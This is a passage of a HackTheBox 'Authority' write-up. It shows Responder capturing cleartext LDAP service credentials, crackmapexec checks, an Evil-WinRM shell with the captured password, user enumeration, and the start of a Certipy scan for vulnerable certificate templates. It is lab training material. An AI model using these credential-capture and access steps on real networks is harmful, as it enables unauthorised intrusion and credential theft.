           <span class="n">NBT</span><span class="o">-</span><span class="n">NS</span><span class="p">,</span> <span class="n">LLMNR</span> <span class="o">&amp;</span> <span class="n">MDNS</span> <span class="n">Responder</span> <span class="mf">3.1.3.0</span>

  <span class="n">To</span> <span class="n">support</span> <span class="n">this</span> <span class="n">project</span><span class="p">:</span>
  <span class="n">Patreon</span> <span class="o">-&gt;</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">patreon</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">PythonResponder</span>
  <span class="n">Paypal</span>  <span class="o">-&gt;</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">paypal</span><span class="o">.</span><span class="n">me</span><span class="o">/</span><span class="n">PythonResponder</span>

  <span class="n">Author</span><span class="p">:</span> <span class="n">Laurent</span> <span class="n">Gaffie</span> <span class="p">(</span><span class="n">laurent</span><span class="o">.</span><span class="n">gaffie</span><span class="nd">@gmail</span><span class="o">.</span><span class="n">com</span><span class="p">)</span>
  <span class="n">To</span> <span class="n">kill</span> <span class="n">this</span> <span class="n">script</span> <span class="n">hit</span> <span class="n">CTRL</span><span class="o">-</span><span class="n">C</span>


<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Poisoners</span><span class="p">:</span>
    <span class="n">LLMNR</span>                      <span class="p">[</span><span class="n">ON</span><span class="p">]</span>
    <span class="n">NBT</span><span class="o">-</span><span class="n">NS</span>                     <span class="p">[</span><span class="n">ON</span><span class="p">]</span>
    <span class="n">MDNS</span>                       <span class="p">[</span><span class="n">ON</span><span class="p">]</span>
    <span class="n">DNS</span>                        <span class="p">[</span><span class="n">ON</span><span class="p">]</span>
    <span class="n">DHCP</span>                       <span class="p">[</span><span class="n">OFF</span><span class="p">]</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Servers</span><span class="p">:</span>
    <span class="n">HTTP</span> <span class="n">server</span>                <span class="p">[</span><span class="n">ON</span><span class="p">]</span>
    <span class="n">HTTPS</span> <span class="n">server</span>               <span class="p">[</span><span class="n">ON</span><span class="p">]</span>
    <span class="n">WPAD</span> <span class="n">proxy</span>                 <span class="p">[</span><span class="n">OFF</span><span class="p">]</span>
    <span class="n">Auth</span> <span class="n">proxy</span>                 <span class="p">[</span><span class="n">OFF</span><span class="p">]</span>
    <span class="n">SMB</span> <span class="n">server</span>                 <span class="p">[</span><span class="n">ON</span><span class="p">]</span>
    <span class="n">Kerberos</span> <span class="n">server</span>            <span class="p">[</span><span class="n">ON</span><span class="p">]</span>
    <span class="n">SQL</span> <span class="n">server</span>                 <span class="p">[</span><span class="n">ON</span><span class="p">]</span>
    <span class="n">FTP</span> <span class="n">server</span>                 <span class="p">[</span><span class="n">ON</span><span class="p">]</span>
    <span class="n">IMAP</span> <span class="n">server</span>                <span class="p">[</span><span class="n">ON</span><span class="p">]</span>
    <span class="n">POP3</span> <span class="n">server</span>                <span class="p">[</span><span class="n">ON</span><span class="p">]</span>
    <span class="n">SMTP</span> <span class="n">server</span>                <span class="p">[</span><span class="n">ON</span><span class="p">]</span>
    <span class="n">DNS</span> <span class="n">server</span>                 <span class="p">[</span><span class="n">ON</span><span class="p">]</span>
    <span class="n">LDAP</span> <span class="n">server</span>                <span class="p">[</span><span class="n">ON</span><span class="p">]</span>
    <span class="n">RDP</span> <span class="n">server</span>                 <span class="p">[</span><span class="n">ON</span><span class="p">]</span>
    <span class="n">DCE</span><span class="o">-</span><span class="n">RPC</span> <span class="n">server</span>             <span class="p">[</span><span class="n">ON</span><span class="p">]</span>
    <span class="n">WinRM</span> <span class="n">server</span>               <span class="p">[</span><span class="n">ON</span><span class="p">]</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">HTTP</span> <span class="n">Options</span><span class="p">:</span>
    <span class="n">Always</span> <span class="n">serving</span> <span class="n">EXE</span>         <span class="p">[</span><span class="n">OFF</span><span class="p">]</span>
    <span class="n">Serving</span> <span class="n">EXE</span>                <span class="p">[</span><span class="n">OFF</span><span class="p">]</span>
    <span class="n">Serving</span> <span class="n">HTML</span>               <span class="p">[</span><span class="n">OFF</span><span class="p">]</span>
    <span class="n">Upstream</span> <span class="n">Proxy</span>             <span class="p">[</span><span class="n">OFF</span><span class="p">]</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Poisoning</span> <span class="n">Options</span><span class="p">:</span>
    <span class="n">Analyze</span> <span class="n">Mode</span>               <span class="p">[</span><span class="n">OFF</span><span class="p">]</span>
    <span class="n">Force</span> <span class="n">WPAD</span> <span class="n">auth</span>            <span class="p">[</span><span class="n">OFF</span><span class="p">]</span>
    <span class="n">Force</span> <span class="n">Basic</span> <span class="n">Auth</span>           <span class="p">[</span><span class="n">OFF</span><span class="p">]</span>
    <span class="n">Force</span> <span class="n">LM</span> <span class="n">downgrade</span>         <span class="p">[</span><span class="n">OFF</span><span class="p">]</span>
    <span class="n">Force</span> <span class="n">ESS</span> <span class="n">downgrade</span>        <span class="p">[</span><span class="n">OFF</span><span class="p">]</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Generic</span> <span class="n">Options</span><span class="p">:</span>
    <span class="n">Responder</span> <span class="n">NIC</span>              <span class="p">[</span><span class="n">tun0</span><span class="p">]</span>
    <span class="n">Responder</span> <span class="n">IP</span>               <span class="p">[</span><span class="mf">10.10.14.10</span><span class="p">]</span>
    <span class="n">Responder</span> <span class="n">IPv6</span>             <span class="p">[</span><span class="n">dead</span><span class="p">:</span><span class="n">beef</span><span class="p">:</span><span class="mi">2</span><span class="p">::</span><span class="mi">1008</span><span class="p">]</span>
    <span class="n">Challenge</span> <span class="nb">set</span>              <span class="p">[</span><span class="n">random</span><span class="p">]</span>
    <span class="n">Don</span><span class="s1">'t Respond To Names     ['</span><span class="n">ISATAP</span><span class="s1">']</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Current</span> <span class="n">Session</span> <span class="n">Variables</span><span class="p">:</span>
    <span class="n">Responder</span> <span class="k">Machine</span> <span class="n">Name</span>     <span class="p">[</span><span class="n">WIN</span><span class="o">-</span><span class="n">ZNYNWH2OMK2</span><span class="p">]</span>
    <span class="n">Responder</span> <span class="n">Domain</span> <span class="n">Name</span>      <span class="p">[</span><span class="mi">3</span><span class="n">VZO</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">]</span>
    <span class="n">Responder</span> <span class="n">DCE</span><span class="o">-</span><span class="n">RPC</span> <span class="n">Port</span>     <span class="p">[</span><span class="mi">48048</span><span class="p">]</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Listening</span> <span class="k">for</span> <span class="n">events</span><span class="o">...</span>
</pre></div>

Now, let's click on <code>Test LDAP Profile</code>:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/authority/img/11.png"/><br/><br/>
Finally, we captured the <code>LDAP Request</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="p">[</span><span class="n">LDAP</span><span class="p">]</span> <span class="n">Attempting</span> <span class="n">to</span> <span class="n">parse</span> <span class="n">an</span> <span class="n">old</span> <span class="n">simple</span> <span class="n">Bind</span> <span class="n">request</span><span class="o">.</span>
<span class="p">[</span><span class="n">LDAP</span><span class="p">]</span> <span class="n">Cleartext</span> <span class="n">Client</span>   <span class="p">:</span> <span class="mf">10.10.11.222</span>
<span class="p">[</span><span class="n">LDAP</span><span class="p">]</span> <span class="n">Cleartext</span> <span class="n">Username</span> <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">svc_ldap</span><span class="p">,</span><span class="n">OU</span><span class="o">=</span><span class="n">Service</span> <span class="n">Accounts</span><span class="p">,</span><span class="n">OU</span><span class="o">=</span><span class="n">CORP</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">authority</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">htb</span>
<span class="p">[</span><span class="n">LDAP</span><span class="p">]</span> <span class="n">Cleartext</span> <span class="n">Password</span> <span class="p">:</span> <span class="n">lDaP_1n_th3_cle4r</span><span class="err">!</span>
</pre></div>

We obtained credentials for the <code>svc_ldap</code> user:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.222</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'svc_ldap'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.222</span>    <span class="mi">445</span>    <span class="n">AUTHORITY</span>        <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">AUTHORITY</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">authority</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.222</span>    <span class="mi">445</span>    <span class="n">AUTHORITY</span>        <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">authority</span><span class="o">.</span><span class="n">htb</span>\<span class="n">svc_ldap</span><span class="p">:</span><span class="n">lDaP_1n_th3_cle4r</span><span class="err">!</span>
</pre></div>

Since the WinRM service (Port 5985) is available, we can check if <code>svc_ldap</code> belongs to the <code>Remote Management Users</code> group. If that's the case, we can obtain a shell as <code>svc_ldap</code> by connecting to the WinRM service using tools like <code>Evil-WinRM</code>.<br/><br/>
We can check this using <code>crackmapexec</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">crackmapexec</span> <span class="n">winrm</span> <span class="mf">10.10.11.222</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'svc_ldap'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.222</span>    <span class="mi">5985</span>   <span class="n">AUTHORITY</span>        <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">AUTHORITY</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">authority</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span>
<span class="n">HTTP</span>        <span class="mf">10.10.11.222</span>    <span class="mi">5985</span>   <span class="n">AUTHORITY</span>        <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.222</span><span class="p">:</span><span class="mi">5985</span><span class="o">/</span><span class="n">wsman</span>
<span class="n">WINRM</span>       <span class="mf">10.10.11.222</span>    <span class="mi">5985</span>   <span class="n">AUTHORITY</span>        <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">authority</span><span class="o">.</span><span class="n">htb</span>\<span class="n">svc_ldap</span><span class="p">:</span><span class="n">lDaP_1n_th3_cle4r</span><span class="err">!</span> <span class="p">(</span><span class="n">Pwn3d</span><span class="err">!</span><span class="p">)</span>
</pre></div>

Now that we know <code>svc_ldap</code> belongs to the <code>Remote Management Users</code> group, we can use <code>Evil-WinRM</code> to obtain a shell:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">evil</span><span class="o">-</span><span class="n">winrm</span> <span class="o">-</span><span class="n">i</span> <span class="mf">10.10.11.222</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'svc_ldap'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span>

<span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span> <span class="n">shell</span> <span class="n">v3</span><span class="mf">.5</span>

<span class="n">Info</span><span class="p">:</span> <span class="n">Establishing</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">remote</span> <span class="n">endpoint</span>
<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">svc_ldap</span>\<span class="n">Documents</span><span class="o">&gt;</span>
</pre></div>

We have successfully accessed the system as the <code>svc_ldap</code> user, and we can now read the first flag:<br/><br/>
<div class="highlight"><pre><span></span><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">svc_ldap</span>\<span class="n">Documents</span><span class="o">&gt;</span> <span class="n">cat</span> <span class="o">..</span>\<span class="n">desktop</span>\<span class="n">user</span><span class="o">.</span><span class="n">txt</span>
<span class="n">cf744</span><span class="o">**********************</span><span class="n">d8f4d</span>
<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">svc_ldap</span>\<span class="n">Documents</span><span class="o">&gt;</span>
</pre></div>

The <code>svc_ldap</code> user doesn't have any interesting privileges:<br/><br/>
<div class="highlight"><pre><span></span><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">svc_ldap</span>\<span class="n">Documents</span><span class="o">&gt;</span> <span class="n">whoami</span> <span class="o">/</span><span class="n">priv</span>

<span class="n">PRIVILEGES</span> <span class="n">INFORMATION</span>
<span class="o">----------------------</span>

<span class="n">Privilege</span> <span class="n">Name</span>                <span class="n">Description</span>                    <span class="n">State</span>
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
<span class="n">SeMachineAccountPrivilege</span>     <span class="n">Add</span> <span class="n">workstations</span> <span class="n">to</span> <span class="n">domain</span>     <span class="n">Enabled</span>
<span class="n">SeChangeNotifyPrivilege</span>       <span class="n">Bypass</span> <span class="n">traverse</span> <span class="n">checking</span>       <span class="n">Enabled</span>
<span class="n">SeIncreaseWorkingSetPrivilege</span> <span class="n">Increase</span> <span class="n">a</span> <span class="n">process</span> <span class="n">working</span> <span class="nb">set</span> <span class="n">Enabled</span>
<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">svc_ldap</span>\<span class="n">Documents</span><span class="o">&gt;</span>
</pre></div>

And doesn't belong to any interesting groups:<br/><br/>
<div class="highlight"><pre><span></span><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">svc_ldap</span>\<span class="n">Documents</span><span class="o">&gt;</span> <span class="n">whoami</span> <span class="o">/</span><span class="nb">all</span>

<span class="n">USER</span> <span class="n">INFORMATION</span>
<span class="o">----------------</span>

<span class="n">User</span> <span class="n">Name</span>    <span class="n">SID</span>
<span class="o">============</span> <span class="o">=============================================</span>
<span class="n">htb</span>\<span class="n">svc_ldap</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">622327497</span><span class="o">-</span><span class="mi">3269355298</span><span class="o">-</span><span class="mi">2248959698</span><span class="o">-</span><span class="mi">1601</span>


<span class="n">GROUP</span> <span class="n">INFORMATION</span>
<span class="o">-----------------</span>

<span class="n">Group</span> <span class="n">Name</span>                                  <span class="n">Type</span>             <span class="n">SID</span>          <span class="n">Attributes</span>
<span class="o">===========================================</span> <span class="o">================</span> <span class="o">============</span> <span class="o">==================================================</span>
<span class="n">Everyone</span>                                    <span class="n">Well</span><span class="o">-</span><span class="n">known</span> <span class="n">group</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">0</span>      <span class="n">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="n">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">group</span>
<span class="n">BUILTIN</span>\<span class="n">Remote</span> <span class="n">Management</span> <span class="n">Users</span>             <span class="n">Alias</span>            <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">32</span><span class="o">-</span><span class="mi">580</span> <span class="n">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="n">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">group</span>
<span class="n">BUILTIN</span>\<span class="n">Users</span>                               <span class="n">Alias</span>            <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">32</span><span class="o">-</span><span class="mi">545</span> <span class="n">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="n">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">group</span>
<span class="n">BUILTIN</span>\<span class="n">Pre</span><span class="o">-</span><span class="n">Windows</span> <span class="mi">2000</span> <span class="n">Compatible</span> <span class="n">Access</span>  <span class="n">Alias</span>            <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">32</span><span class="o">-</span><span class="mi">554</span> <span class="n">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="n">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">group</span>
<span class="n">BUILTIN</span>\<span class="n">Certificate</span> <span class="n">Service</span> <span class="n">DCOM</span> <span class="n">Access</span>     <span class="n">Alias</span>            <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">32</span><span class="o">-</span><span class="mi">574</span> <span class="n">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="n">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">group</span>
<span class="n">NT</span> <span class="n">AUTHORITY</span>\<span class="n">NETWORK</span>                        <span class="n">Well</span><span class="o">-</span><span class="n">known</span> <span class="n">group</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">2</span>      <span class="n">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="n">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">group</span>
<span class="n">NT</span> <span class="n">AUTHORITY</span>\<span class="n">Authenticated</span> <span class="n">Users</span>            <span class="n">Well</span><span class="o">-</span><span class="n">known</span> <span class="n">group</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">11</span>     <span class="n">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="n">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">group</span>
<span class="n">NT</span> <span class="n">AUTHORITY</span>\<span class="n">This</span> <span class="n">Organization</span>              <span class="n">Well</span><span class="o">-</span><span class="n">known</span> <span class="n">group</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">15</span>     <span class="n">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="n">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">group</span>
<span class="n">NT</span> <span class="n">AUTHORITY</span>\<span class="n">NTLM</span> <span class="n">Authentication</span>            <span class="n">Well</span><span class="o">-</span><span class="n">known</span> <span class="n">group</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="mi">10</span>  <span class="n">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="n">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">group</span>
<span class="n">Mandatory</span> <span class="n">Label</span>\<span class="n">Medium</span> <span class="n">Plus</span> <span class="n">Mandatory</span> <span class="n">Level</span> <span class="n">Label</span>            <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">16</span><span class="o">-</span><span class="mi">8448</span>


<span class="n">PRIVILEGES</span> <span class="n">INFORMATION</span>
<span class="o">----------------------</span>

<span class="n">Privilege</span> <span class="n">Name</span>                <span class="n">Description</span>                    <span class="n">State</span>
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
<span class="n">SeMachineAccountPrivilege</span>     <span class="n">Add</span> <span class="n">workstations</span> <span class="n">to</span> <span class="n">domain</span>     <span class="n">Enabled</span>
<span class="n">SeChangeNotifyPrivilege</span>       <span class="n">Bypass</span> <span class="n">traverse</span> <span class="n">checking</span>       <span class="n">Enabled</span>
<span class="n">SeIncreaseWorkingSetPrivilege</span> <span class="n">Increase</span> <span class="n">a</span> <span class="n">process</span> <span class="n">working</span> <span class="nb">set</span> <span class="n">Enabled</span>


<span class="n">USER</span> <span class="n">CLAIMS</span> <span class="n">INFORMATION</span>
<span class="o">-----------------------</span>

<span class="n">User</span> <span class="n">claims</span> <span class="n">unknown</span><span class="o">.</span>

<span class="n">Kerberos</span> <span class="n">support</span> <span class="k">for</span> <span class="n">Dynamic</span> <span class="n">Access</span> <span class="n">Control</span> <span class="n">on</span> <span class="n">this</span> <span class="n">device</span> <span class="n">has</span> <span class="n">been</span> <span class="n">disabled</span><span class="o">.</span>
<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">svc_ldap</span>\<span class="n">Documents</span><span class="o">&gt;</span>
</pre></div>

After further enumerating the system, I thought about examining ADCS as it might be a potential avenue for privilege escalation.<br/><br/>
Firstly, I enumerated vulnerable templates using the <a href="https://github.com/ly4k/Certipy">Certipy</a> tool:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">certipy</span><span class="o">-</span><span class="n">ad</span> <span class="n">find</span> <span class="o">-</span><span class="n">vulnerable</span> <span class="o">-</span><span class="n">username</span> <span class="s1">'svc_ldap@authority.htb'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'lDaP_1n_th3_cle4r!'</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">10.10.11.222</span> <span class="o">-</span><span class="n">stdout</span>
<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.7.0</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Finding</span> <span class="n">certificate</span> <span class="n">templates</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="mi">37</span> <span class="n">certificate</span> <span class="n">templates</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Finding</span> <span class="n">certificate</span> <span class="n">authorities</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="mi">1</span> <span class="n">certificate</span> <span class="n">authority</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="mi">13</span> <span class="n">enabled</span> <span class="n">certificate</span> <span class="n">templates</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">get</span> <span class="n">CA</span> <span class="n">configuration</span> <span class="k">for</span> <span class="s1">'AUTHORITY-CA'</span> <span class="n">via</span> <span class="n">CSRA</span>
<span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">Got</span> <span class="n">error</span> <span class="k">while</span> <span class="n">trying</span> <span class="n">to</span> <span class="n">get</span> <span class="n">CA</span> <span class="n">configuration</span> <span class="k">for</span> <span class="s1">'AUTHORITY-CA'</span> <span class="n">via</span> <span class="n">CSRA</span><span class="p">:</span> <span class="n">CASessionError</span><span class="p">:</span> <span class="n">code</span><span class="p">:</span> <span class="mh">0x80070005</span> <span class="o">-</span> <span class="n">E_ACCESSDENIED</span> <span class="o">-</span> <span class="n">General</span> <span class="n">access</span> <span class="n">denied</span> <span class="n">error</span><span class="o">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">get</span> <span class="n">CA</span> <span class="n">configuration</span> <span class="k">for</span> <span class="s1">'AUTHORITY-CA'</span> <span class="n">via</span> <span class="n">RRP</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">CA</span> <span class="n">configuration</span> <span class="k">for</span> <span class="s1">'AUTHORITY-CA'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Enumeration</span> <span class="n">output</span><span class="p">:</span>
<span class="n">Certificate</span> <span class="n">Authorities</span>
  <span class="mi">0</span>
    <span class="n">CA</span> <span class="n">Name</span>                             <span class="p">:</span> <span class="n">AUTHORITY</span><span class="o">-</span><span class="n">CA</span>
    <span class="n">DNS</span> <span class="n">Name</span>                            <span class="p">:</span> <span class="n">authority</span><span class="o">.</span><span class="n">authority</span><span class="o">.</span><span class="n">htb</span>
    <span class="n">Certificate</span> <span class="n">Subject</span>                 <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">AUTHORITY</span><span class="o">-</span><span class="n">CA</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">authority</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">htb</span>
    <span class="n">Certificate</span> <span class="n">Serial</span> <span class="n">Number</span>           <span class="p">:</span> <span class="mi">2</span><span class="n">C4E1F3CA46BBDAF42A1DDE3EC33A6B4</span>
    <span class="n">Certificate</span> <span class="n">Validity</span> <span class="n">Start</span>          <span class="p">:</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">24</span> <span class="mi">01</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">26</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>
    <span class="n">Certificate</span> <span class="n">Validity</span> <span class="n">End</span>            <span class="p">:</span> <span class="mi">2123</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">24</span> <span class="mi">01</span><span class="p">:</span><span class="mi">56</span><span class="p">:</span><span class="mi">25</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>
    <span class="n">Web</span> <span class="n">Enrollment</span>                      <span class="p">:</span> <span class="n">Disabled</span>
    <span class="n">User</span> <span class="n">Specified</span> <span class="n">SAN</span>                  <span class="p">:</span> <span class="n">Disabled</span>
    <span class="n">Request</span> <span class="n">Disposition</span>                 <span class="p">:</span> <span class="n">Issue</span>
    <span class="n">Enforce</span> <span class="n">Encryption</span> <span class="k">for</span> <span class="n">Requests</span>     <span class="p">:</span> <span class="n">Enabled</span>
    <span class="n">Permissions</span>
      <span class="n">Owner</span>                             <span class="p">:</span> <span class="n">AUTHORITY</span><span class="o">.</span><span class="n">HTB</span>\<span class="n">Administrators</span>
      <span class="n">Access</span> <span class="n">Rights</span>
        <span class="n">ManageCa</span>                        <span class="p">:</span> <span class="n">AUTHORITY</span><span class="o">.</span><span class="n">HTB</span>\<span class="n">Administrators</span>
                                          <span class="n">AUTHORITY</span><span class="o">.</span><span class="n">HTB</span>\<span class="n">Domain</span> <span class="n">Admins</span>
                                          <span class="n">AUTHORITY</span><span class="o">.</span><span class="n">HTB</span>\<span class="n">Enterprise</span> <span class="n">Admins</span>
        <span class="n">ManageCertificates</span>              <span class="p">:</span> <span class="n">AUTHORITY</span><span class="o">.</span><span class="n">HTB</span>\<span class="n">Administrators</span>
                                          <span class="n">AUTHORITY</span><span class="o">.</span><span class="n">HTB</span>\<span class="n">Domain</span> <span class="n">Admins</span>
                                          <span class="n">AUTHORITY</span><span class="o">.</span><span class="n">HTB</span>\<span class="n">Enterprise</span> <span class="n">Admins</span>
        <span class="n">Enroll</span>                          <span class="p">:</span> <span class="n">AUTHORITY</span><span class="o">.</span><span class="n">HTB</span>\<span class="n">Authenticated</span> <span class="n">Users</span>
<span class="n">Certificate</span> <span class="n">Templates</span>
  <span class="mi">0</span>
    <span class="n">Template</span> <span class="n">Name</span>                       <span class="p">:</span> <span class="n">CorpVPN</span>
    <span class="n">Display</span> <span class="n">Name</span>                        <span class="p">:</span> <span class="n">Corp</span> <span class="n">VPN</span>
    <span class="n">Certificate</span> <span class="n">Authorities</span>             <span class="p">:</span> <span class="n">AUTHORITY</span><span class="o">-</span><span class="n">CA</span>
    <span class="n">Enabled</span>                             <span class="p">:</span> <span class="kc">True</span>
